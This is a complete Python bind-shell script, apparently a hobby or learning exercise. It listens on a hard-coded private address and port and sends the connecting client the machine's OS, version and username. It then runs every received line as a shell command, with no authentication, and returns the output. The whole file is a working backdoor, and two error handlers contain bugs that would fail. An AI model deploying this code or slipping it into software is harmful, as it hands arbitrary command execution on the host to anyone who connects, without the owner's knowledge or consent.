import socket
import sys
import os
import platform
import subprocess
host = "192.168.43.12"
port = 8087
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print('\nSocket has been created\n')

try:
    sock.bind((host, port))
    print('host Succesfully binded !\n')
    try :    
        sock.listen(1)
        print(f"Server {host} is listening on port {port}\n")
        connection_infos ,(client_host, client_port) = sock.accept()
        print(f'Connection From: {client_host} on Port: {client_port}\n')
        connection_infos.sendall(f" Your Connected to a : {platform.uname().system} Machine --- version : {platform.uname().version} --- User : {os.getlogin( )} \n".encode())
        while True:
            connection_infos.sendall("Type your Commande : ".encode())
            request = connection_infos.recv(2048)
            print(f"Command Entred Is : {request.decode()}\n")
            output =subprocess.Popen(request.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,text='utf-8')
            connection_infos.sendall(output.stdout.read().encode())
    except ConnectionAbortedError as e :
        print('The peer has Aborted The Connection !!!\n')
    except Exception as e :
        print('Failed to listen ! : ' + e)
except Exception as err:
    print ('Binding has failed. Error Code is : ' + str(err[0])+ ' Message : ' + err[1])
    sys.exit()


    



